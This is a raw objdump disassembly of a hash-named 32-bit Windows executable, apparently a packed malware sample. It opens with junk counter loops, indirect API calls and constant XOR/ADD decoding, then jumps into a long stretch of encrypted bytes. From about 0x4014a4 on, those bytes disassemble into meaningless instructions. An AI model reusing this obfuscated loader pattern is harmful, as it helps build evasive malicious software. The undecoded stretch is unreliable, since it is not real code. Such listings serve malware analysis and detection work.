
fb8683086bfd0a9aaa97b7719fce23e315b66e2924afff2b5ec47f2c81ea59e5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421952
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421a5e
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4234de
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4235a5
  4012ea:	push   0x423629
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	call   0x40914a
  401431:	test   eax,eax
  401433:	je     0x401464
  401439:	lea    eax,[ebp-0x90]
  40143f:	push   eax
  401440:	mov    eax,DWORD PTR [ebp-0x30]
  401443:	xor    eax,esi
  401445:	add    eax,edi
  401447:	push   eax
  401448:	mov    eax,DWORD PTR [ebp-0x2c]
  40144b:	add    eax,0xaa
  401450:	push   eax
  401451:	mov    eax,DWORD PTR [ebp-0x2c]
  401454:	mov    eax,DWORD PTR [eax+0x198]
  40145a:	push   DWORD PTR [eax]
  40145c:	call   0x405c6f
  401461:	mov    DWORD PTR [ebp-0x40],eax
  401464:	lea    eax,[ebp+0x4]
  401467:	mov    DWORD PTR [ebp-0x34],eax
  40146a:	mov    eax,DWORD PTR [ebp-0x8]
  40146d:	mov    eax,DWORD PTR [eax]
  40146f:	mov    eax,DWORD PTR [eax]
  401471:	mov    eax,DWORD PTR [eax]
  401473:	test   eax,eax
  401475:	je     0x4038ab
  40147b:	lea    eax,[ebp-0xc]
  40147e:	mov    DWORD PTR [ebp-0x4c],eax
  401481:	mov    eax,DWORD PTR [ebp-0x3c]
  401484:	mov    DWORD PTR [ebp-0xc],eax
  401487:	mov    eax,DWORD PTR [ebp-0x8]
  40148a:	mov    eax,DWORD PTR [eax]
  40148c:	mov    eax,DWORD PTR [eax]
  40148e:	mov    eax,DWORD PTR [eax]
  401490:	sub    DWORD PTR [ebp-0xc],eax
  401493:	mov    ecx,DWORD PTR [ebp-0x10]
  401496:	xor    ecx,esi
  401498:	mov    eax,0xffcd8d25
  40149d:	sub    eax,ecx
  40149f:	jmp    0x403854
  4014a4:	out    dx,al
  4014a5:	add    eax,0x6723a723
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	sbb    DWORD PTR [edx+0x1b],0xf
  4014af:	hlt    
  4014b0:	gs pop ss
  4014b2:	sub    BYTE PTR ds:0x62626262,0xca
  4014b9:	pop    edi
  4014ba:	bound  esp,QWORD PTR [edx+0x9]
  4014bd:	sub    eax,DWORD PTR [edi]
  4014bf:	pop    edx
  4014c0:	add    eax,0x792c0356
  4014c5:	pop    ebx
  4014c6:	jne    0x40150f
  4014c8:	pushf  
  4014c9:	jo     0x40153d
  4014cb:	inc    esp
  4014cc:	jno    0x4014f3
  4014ce:	iret   
  4014cf:	retf   
  4014d0:	hlt    
  4014d1:	inc    ebp
  4014d2:	aam    0x97
  4014d4:	cdq    
  4014d5:	add    ebp,DWORD PTR [edx]
  4014d7:	pop    esp
  4014d8:	jno    0x401544
  4014da:	mov    es,WORD PTR [edx-0x43be3b9c]
  4014e0:	daa    
  4014e1:	mov    ecx,0x54f9627
  4014e6:	shr    BYTE PTR [ebp+eax*1+0x2],1
  4014ea:	adc    cl,al
  4014ec:	(bad)  
  4014ed:	(bad)  [esi-0x78]
  4014f0:	and    BYTE PTR [esi+0x31c900b0],dl
  4014f6:	dec    esi
  4014f7:	fbstp  TBYTE PTR [edx-0x62cc368d]
  4014fd:	mov    cs,WORD PTR [eax+0x78]
  401500:	jo     0x4014b8
  401502:	dec    edi
  401503:	pushf  
  401504:	pop    eax
  401505:	jae    0x401491
  401507:	sti    
  401508:	push   es
  401509:	push   0xc72c3d54
  40150e:	pop    esi
  40150f:	cmp    BYTE PTR [edx+0x6c],dl
  401512:	add    ecx,DWORD PTR [edi]
  401514:	push   ss
  401515:	jge    0x40153e
  401517:	mov    ebx,0xa6ab63c3
  40151c:	mov    esp,0xc531c291
  401521:	stc    
  401522:	inc    ebx
  401523:	popf   
  401524:	xchg   edx,eax
  401525:	in     eax,0x12
  401527:	fstp   QWORD PTR [edx]
  401529:	jg     0x4014c9
  40152b:	cmp    ecx,edi
  40152d:	mov    al,ds:0xdb808269
  401532:	dec    ecx
  401533:	loop   0x4014ee
  401535:	inc    eax
  401536:	or     BYTE PTR [ebx],0x2c
  401539:	inc    ebx
  40153a:	pop    ecx
  40153b:	mov    ecx,0xda183803
  401540:	xor    ebx,DWORD PTR [esi+0x22]
  401543:	sbb    ch,BYTE PTR [ebx+ecx*1]
  401546:	inc    esi
  401547:	add    esp,DWORD PTR [eax-0x32d94fe1]
  40154d:	dec    ebp
  40154e:	nop
  40154f:	xchg   edi,eax
  401550:	dec    esi
  401551:	mov    cl,0x25
  401553:	pop    ecx
  401554:	les    ebp,FWORD PTR [eax]
  401556:	sub    eax,ecx
  401558:	vpsubusw xmm0,xmm7,XMMWORD PTR [edi-0x25]
  40155d:	mov    edi,0xdb06d0ab
  401562:	test   al,0x7e
  401564:	bound  edx,QWORD PTR [ebp+0x268b1b46]
  40156a:	in     eax,0xc2
  40156c:	push   ds
  40156d:	sub    DWORD PTR [ebp+0x6c],0x51
  401571:	imul   ebp,edx,0x1ed00cb4
  401577:	sbb    al,0x9b
  401579:	fist   WORD PTR [edi]
  40157b:	mov    eax,ds:0x416ba731
  401580:	ins    DWORD PTR es:[edi],dx
  401581:	clc    
  401582:	stc    
  401583:	aas    
  401584:	jo     0x401543
  401586:	sbb    DWORD PTR [ebx-0x44b4c50b],edx
  40158c:	std    
  40158d:	sbb    eax,0x1a154046
  401592:	dec    ebp
  401593:	sub    DWORD PTR ds:0x315ab431,0xe
  40159a:	and    BYTE PTR [eax+esi*8],ch
  40159d:	cmp    al,0xab
  40159f:	loopne 0x4015c1
  4015a1:	and    ch,BYTE PTR [edi+ebx*2]
  4015a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015a5:	dec    eax
  4015a6:	mov    ch,0xd0
  4015a8:	mov    BYTE PTR [ecx],bl
  4015aa:	adc    BYTE PTR [edi-0x4ecd523],ch
  4015b0:	mov    DWORD PTR [edi-0x5becceb3],eax
  4015b6:	fisttp WORD PTR [esi]
  4015b8:	xchg   esi,eax
  4015b9:	mov    WORD PTR [esi+0x194459a2],ds
  4015bf:	loopne 0x4015da
  4015c1:	mov    al,0x7a
  4015c3:	dec    ebx
  4015c4:	ss aaa 
  4015c6:	aas    
  4015c7:	push   edx
  4015c8:	(bad)  
  4015c9:	hlt    
  4015ca:	inc    ebp
  4015cb:	inc    esi
  4015cc:	lds    esp,FWORD PTR [edx+0x73]
  4015cf:	adc    BYTE PTR [ecx],bl
  4015d1:	sahf   
  4015d2:	outs   dx,DWORD PTR ds:[esi]
  4015d3:	dec    edx
  4015d4:	mov    eax,ds:0x47d717e7
  4015d9:	test   BYTE PTR [edi-0x1606c128],al
  4015df:	ja     0x4015d2
  4015e1:	jmp    0x401617
  4015e3:	push   ds
  4015e4:	je     0x401612
  4015e6:	sbb    cl,BYTE PTR [esi+0x751cc080]
  4015ec:	sub    al,0xc6
  4015ee:	add    eax,0xb8835472
  4015f3:	pop    ss
  4015f4:	lock or eax,0x71eb3301
  4015fa:	push   esi
  4015fb:	std    
  4015fc:	inc    ecx
  4015fd:	or     dl,cl
  4015ff:	es jg  0x40163c
  401602:	mov    WORD PTR [esi+eax*1+0x76],gs
  401606:	nop
  401607:	dec    esp
  401608:	push   ebp
  401609:	xor    cl,BYTE PTR [eax+0x5c19ee22]
  40160f:	sbb    BYTE PTR [esi-0xcc6e619],dh
  401615:	inc    ebp
  401616:	ficomp DWORD PTR [esi+esi*4+0x21]
  40161a:	jno    0x401699
  40161c:	je     0x401611
  40161e:	fimul  DWORD PTR [ecx-0x6de6139e]
  401624:	jo     0x4015ed
  401626:	(bad)  
  401627:	dec    ecx
  401628:	into   
  401629:	xchg   esi,eax
  40162a:	jbe    0x4015ce
  40162c:	jmp    0x16a2:0xc2c84cdd
  401633:	mov    al,0xd8
  401635:	xor    dl,cl
  401637:	ins    BYTE PTR es:[edi],dx
  401638:	mov    al,0x79
  40163a:	add    bl,dl
  40163c:	xlat   BYTE PTR ds:[ebx]
  40163d:	popa   
  40163e:	mov    DWORD PTR [eax+0x30],ecx
  401641:	adc    ebx,ebx
  401643:	dec    ebx
  401644:	ror    BYTE PTR [esp],1
  401647:	mov    es,WORD PTR [edi-0x38]
  40164a:	div    DWORD PTR [ebx-0x6a8753c6]
  401650:	gs stos DWORD PTR es:[edi],eax
  401652:	pop    edx
  401653:	mov    cl,0x2
  401655:	cwde   
  401656:	cmp    edx,DWORD PTR [edx+0x5931b414]
  40165c:	mov    al,BYTE PTR [eax+ebp*1+0x6b1d0a94]
  401663:	call   0x4f72b96b
  401668:	mov    edx,0x529d292a
  40166d:	test   DWORD PTR [edi+0x7],0x16ec3eda
  401674:	push   ebx
  401675:	xchg   ebp,eax
  401676:	mov    al,ds:0xbdd578a6
  40167b:	lds    ebp,FWORD PTR [eax-0x318531c0]
  401681:	lock mov ebx,0x43a8dda5
  401687:	cmp    al,0xf4
  401689:	cld    
  40168a:	mov    DWORD PTR [esi+0x3a],esi
  40168d:	xor    BYTE PTR [ecx+ebx*4-0x36],0x6b
  401692:	dec    edi
  401693:	cld    
  401694:	ins    BYTE PTR es:[edi],dx
  401695:	mov    al,ds:0x7001cb5c
  40169a:	fidivr DWORD PTR [esi+0x3b]
  40169d:	xchg   ebp,eax
  40169e:	(bad)  
  40169f:	pop    esp
  4016a0:	xchg   edi,eax
  4016a1:	or     DWORD PTR [ecx+0x4476a645],eax
  4016a7:	jmp    0xb7c96078
  4016ac:	mov    eax,ds:0x5a70449e
  4016b1:	pop    es
  4016b2:	sbb    ebp,eax
  4016b4:	fild   WORD PTR [edi]
  4016b6:	shl    bl,1
  4016b8:	fwait
  4016b9:	loopne 0x401657
  4016bb:	xchg   BYTE PTR [ebx+0x67],ch
  4016be:	cmp    esp,DWORD PTR [esi+0x23e52936]
  4016c4:	mov    ds:0x68b86fc2,eax
  4016c9:	xor    eax,0x2bc9d55c
  4016ce:	je     0x401696
  4016d0:	mov    DWORD PTR [eax-0x374f4995],0x625fb36
  4016da:	push   esi
  4016db:	mov    DWORD PTR [eax-0x23],edi
  4016de:	arpl   WORD PTR [ecx+ebx*4-0x4f],bp
  4016e2:	mov    al,ds:0x667c1bab
  4016e7:	icebp  
  4016e8:	mov    gs,WORD PTR gs:[esi+0x50]
  4016ec:	pop    ss
  4016ed:	dec    edi
  4016ee:	fist   DWORD PTR [edi]
  4016f0:	lahf   
  4016f1:	cli    
  4016f2:	sbb    BYTE PTR [ebx+0x32dc96df],cl
  4016f8:	sub    DWORD PTR [edi-0x595a2eaf],eax
  4016fe:	aas    
  4016ff:	in     al,dx
  401700:	pop    es
  401701:	sbb    BYTE PTR [ecx-0x5b],dl
  401704:	mov    WORD PTR [eax+eiz*1-0x4a587cfb],fs
  40170b:	pop    eax
  40170c:	rol    DWORD PTR [eax+0x5f],1
  40170f:	in     eax,dx
  401710:	repnz es pop ebx
  401713:	stc    
  401714:	gs sub al,0x7a
  401717:	jne    0x40170a
  401719:	call   0xd7ec:0x95fbeb38
  401720:	test   al,0xd7
  401722:	lds    ebx,FWORD PTR [eax-0x2b693977]
  401728:	mov    ah,BYTE PTR [eax-0x68f2f50e]
  40172e:	mov    edi,0x536aa541
  401733:	ret    
  401734:	jnp    0x40171d
  401736:	shl    DWORD PTR [ebx-0xb],cl
  401739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40173a:	int3   
  40173b:	js     0x4016d7
  40173d:	jecxz  0x40173c
  40173f:	stos   BYTE PTR es:[edi],al
  401740:	xchg   DWORD PTR [edx],edx
  401742:	mov    bl,0x9e
  401744:	popa   
  401745:	mov    ebx,0x7ba0749e
  40174a:	ja     0x401789
  40174c:	sub    al,0xdf
  40174e:	lods   al,BYTE PTR ds:[esi]
  40174f:	cmp    al,0x3a
  401751:	jg     0x40178f
  401753:	cmp    bl,BYTE PTR [ecx]
  401755:	mov    bh,BYTE PTR [edx+ecx*4+0x2e]
  401759:	dec    ebp
  40175a:	in     al,dx
  40175b:	jmp    0x401772
  40175d:	cmp    al,0x78
  40175f:	fisubr WORD PTR [ebx-0x4a66d8ea]
  401765:	jno    0x401700
  401767:	out    0xbe,eax
  401769:	fild   QWORD PTR [edx+eiz*2]
  40176c:	sbb    ecx,DWORD PTR ds:[esi+0xf]
  401770:	mov    ebp,0x3a37073a
  401775:	add    DWORD PTR [ebx],edi
  401777:	sahf   
  401778:	pop    esp
  401779:	cmp    ecx,DWORD PTR [edx+0x53639473]
  40177f:	fsub   DWORD PTR [esi+0x7a]
  401782:	gs dec edi
  401784:	fs fwait
  401786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401787:	inc    ecx
  401788:	cmc    
  401789:	outs   dx,DWORD PTR ds:[esi]
  40178a:	int3   
  40178b:	inc    esp
  40178c:	call   0xfcd4:0x85786000
  401793:	data16 cmp al,cl
  401796:	or     al,0xe5
  401798:	and    eax,0x5f27f049
  40179d:	adc    al,0xac
  40179f:	retf   
  4017a0:	hlt    
  4017a1:	inc    esi
  4017a2:	fistp  WORD PTR [ebp+0x33eb89d8]
  4017a8:	sbb    bh,dh
  4017aa:	mov    BYTE PTR [eax],al
  4017ac:	movntps XMMWORD PTR [esi],xmm5
  4017af:	outs   dx,BYTE PTR ds:[esi]
  4017b0:	iret   
  4017b1:	int3   
  4017b2:	mov    esi,0x64537bf0
  4017b7:	jno    0x4017b9
  4017b9:	js     0x401752
  4017bb:	add    eax,0xfe584e18
  4017c0:	push   ecx
  4017c1:	lods   eax,DWORD PTR ds:[esi]
  4017c2:	mov    esi,0xfbd06b7c
  4017c7:	ret    
  4017c8:	xchg   edx,eax
  4017c9:	setle  BYTE PTR [edx*8+0x14ca56fc]
  4017d1:	xchg   edi,eax
  4017d2:	data16 pause 
  4017d5:	sub    al,0xa0
  4017d7:	mov    ch,0xa1
  4017d9:	in     eax,0xb7
  4017db:	push   ebx
  4017dc:	and    al,0xfb
  4017de:	inc    edi
  4017df:	leave  
  4017e0:	sbb    BYTE PTR [esi+0x64],dh
  4017e3:	ins    BYTE PTR es:[edi],dx
  4017e4:	xor    eax,DWORD PTR [eax-0x21]
  4017e7:	fwait
  4017e8:	add    eax,0x9483754d
  4017ed:	mov    ds:0xb441d65,al
  4017f2:	rcr    BYTE PTR [edi-0x14ab4371],0xca
  4017f9:	xor    eax,0x5ef87522
  4017fe:	mov    ecx,0x68afb925
  401803:	dec    ebp
  401804:	shl    DWORD PTR ds:0x52bad7a5,1
  40180a:	mov    edi,0xa4228e77
  40180f:	ja     0x4017e1
  401811:	idiv   DWORD PTR [eax+0x25da6edf]
  401817:	ds inc ecx
  401819:	mov    esp,0xe4f583dc
  40181e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  401820:	adc    esp,DWORD PTR [ecx-0x3d051289]
  401826:	leave  
  401827:	test   esi,0xdb262988
  40182d:	jge    0x4017f3
  40182f:	enter  0xff42,0xc1
  401833:	test   eax,0xcc7a543f
  401838:	lods   eax,DWORD PTR ds:[esi]
  401839:	xchg   BYTE PTR [eax],ah
  40183b:	sbb    DWORD PTR [ebp+0x6c8492d0],esi
  401841:	dec    ecx
  401842:	outs   dx,DWORD PTR ds:[esi]
  401843:	mov    ecx,0xb49fc764
  401848:	jmp    0x693e7d40
  40184d:	push   0x38b46d6b
  401852:	leave  
  401853:	mov    esi,0xe2cc95
  401858:	jmp    0xc46efb3
  40185d:	sub    al,0x22
  40185f:	mov    ds,WORD PTR [ecx+esi*8+0x2]
  401863:	jnp    0x4017ee
  401865:	pop    ds
  401866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401867:	sbb    cl,BYTE PTR [edi+0x73c2c373]
  40186d:	mov    ecx,edx
  40186f:	cmc    
  401870:	jo     0x4018a7
  401872:	pusha  
  401873:	ret    0x7fce
  401876:	(bad)  
  401877:	mov    ebp,0x30a8a723
  40187c:	xor    al,0xfc
  40187e:	sub    edx,DWORD PTR ds:0x7bf06d5e
  401884:	pop    ecx
  401885:	mov    ah,0x89
  401887:	push   eax
  401888:	fcompp 
  40188a:	push   eax
  40188b:	or     dh,cl
  40188d:	mov    ch,0xa8
  40188f:	jp     0x4018a1
  401891:	push   esp
  401892:	jp     0x401900
  401894:	je     0x401876
  401896:	pmulhw mm7,QWORD PTR [edx+0x76c7893]
  40189d:	loope  0x401918
  40189f:	xchg   esi,eax
  4018a0:	cmp    al,0xb1
  4018a2:	add    bl,BYTE PTR [edx-0x79]
  4018a5:	aas    
  4018a6:	xchg   ecx,eax
  4018a7:	enter  0xe81,0xe5
  4018ab:	bound  edi,QWORD PTR [ebx-0xf]
  4018ae:	call   0x79a9:0xa9aac6da
  4018b5:	(bad)  
  4018b6:	mul    ebp
  4018b8:	pop    edx
  4018b9:	outs   dx,DWORD PTR ds:[esi]
  4018ba:	xchg   edi,eax
  4018bb:	shr    BYTE PTR [esi+0x7e2286a1],0xcd
  4018c2:	shl    DWORD PTR [ecx+0x65898e72],1
  4018c8:	in     eax,0xe
  4018ca:	push   es
  4018cb:	inc    esi
  4018cc:	mov    bh,0x39
  4018ce:	popa   
  4018cf:	repz mov ch,0x2b
  4018d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018d3:	ror    DWORD PTR [eax+0x3f],1
  4018d6:	ror    BYTE PTR [edi+0x62],0x9
  4018da:	push   es
  4018db:	mov    edx,0x50f90d42
  4018e0:	mov    ds,WORD PTR [edi]
  4018e2:	jmp    0x99dce073
  4018e7:	rep lods al,BYTE PTR ds:[esi]
  4018e9:	retf   
  4018ea:	mov    ah,0xfd
  4018ec:	popf   
  4018ed:	jmp    0x401950
  4018ef:	fs push eax
  4018f1:	pop    esi
  4018f2:	cmp    edi,DWORD PTR [eax-0x2e]
  4018f5:	and    BYTE PTR [ebx+0x5e],al
  4018f8:	(bad)  
  4018f9:	in     al,dx
  4018fa:	mov    ebp,0x45b28cac
  4018ff:	jbe    0x4018f8
  401901:	stos   BYTE PTR es:[edi],al
  401902:	sub    al,0x50
  401904:	mov    WORD PTR [ebx+0x3e],fs
  401907:	cld    
  401908:	sahf   
  401909:	jle    0x4018cb
  40190b:	(bad)  
  40190c:	push   edx
  40190d:	imul   ebx,DWORD PTR [ebx+0x7b],0x76
  401911:	dec    ebp
  401912:	jae    0x40197d
  401914:	imul   esp,DWORD PTR [esi],0xffffffdc
  401917:	or     DWORD PTR [esi+0x5e],ebx
  40191a:	xchg   edx,eax
  40191b:	ds mov ebp,0x8946b19f
  401921:	sbb    al,0xb2
  401923:	adc    ah,BYTE PTR [ebp+0x24]
  401926:	lock sbb esp,eax
  401929:	scas   al,BYTE PTR es:[edi]
  40192a:	into   
  40192b:	adc    eax,0xca6baa8b
  401930:	mov    eax,0xb781f7f
  401935:	les    ebp,FWORD PTR [esi+0x41]
  401938:	and    DWORD PTR [eax+0x495ce13f],edx
  40193e:	sbb    BYTE PTR [edx],bl
  401940:	add    al,0xc9
  401942:	leave  
  401943:	ins    BYTE PTR es:[edi],dx
  401944:	or     BYTE PTR [ebx],al
  401946:	inc    esi
  401947:	test   esp,esi
  401949:	fnstsw WORD PTR [ebp+ecx*4+0x4c]
  40194d:	(bad)  
  40194e:	jg     0x401925
  401950:	xor    eax,0xacb01d72
  401955:	call   0x37b8:0x4aaa862b
  40195c:	jno    0x4018e0
  40195e:	call   0x2137:0x81161f17
  401965:	adc    bl,ah
  401967:	mov    eax,ds:0x3ff6b99a
  40196c:	sahf   
  40196d:	jle    0x4019c7
